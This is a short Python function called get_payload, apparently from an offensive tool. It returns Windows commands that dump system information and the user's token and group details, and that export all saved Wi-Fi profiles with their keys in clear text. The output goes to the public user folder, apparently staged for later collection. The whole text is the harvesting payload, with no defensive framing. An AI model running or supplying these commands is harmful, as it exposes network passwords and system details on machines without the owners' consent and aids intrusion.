def get_payload(output_dir="C:\\Users\\Public"):
    return [
        f"systeminfo | Out-File {output_dir}\\sysinfo.txt",
        f"whoami /all | Out-File {output_dir}\\tokens.txt",
        f"netsh wlan export profile key=clear folder={output_dir}"
    ]
